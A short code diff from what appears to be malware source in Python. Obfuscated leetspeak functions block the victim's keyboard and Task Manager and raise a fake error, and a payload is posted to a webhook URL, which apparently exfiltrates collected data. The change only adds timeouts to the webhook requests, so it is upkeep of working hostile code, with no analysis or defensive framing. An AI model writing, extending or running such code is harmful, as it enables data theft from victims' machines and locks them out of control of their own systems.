@@ -574,7 +574,7 @@ payload = {
     'username': username_embed,
     'avatar_url': avatar_embed,
 }
-requests.post(w3bh00k_ur1, json=payload)
+requests.post(w3bh00k_ur1, json=payload, timeout=5)
 try: B10ck_K3y()
 except: pass
 try: B10ck_T45k_M4n4g3r()
@@ -604,7 +604,7 @@ payload = {
     'username': username_embed,
     'avatar_url': avatar_embed,
 }
-requests.post(w3bh00k_ur1, json=payload)
+requests.post(w3bh00k_ur1, json=payload, timeout=5)
 
 try: F4k3_3rr0r()
 except: pass
